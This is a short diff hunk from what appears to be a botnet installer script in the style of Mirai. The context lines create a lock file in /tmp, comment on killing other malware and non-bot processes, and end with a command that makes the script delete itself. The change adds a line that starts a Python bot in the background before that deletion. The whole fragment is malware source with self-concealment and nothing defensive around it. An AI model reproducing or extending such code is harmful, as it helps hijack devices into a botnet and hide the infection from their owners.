@@ -13,4 +13,6 @@ touch /tmp/mirai.lock
 # kill any other malware in the device
 # kill any process that is not useful to the bot
 
+python3 bot.py &
+
 rm -- "$0"
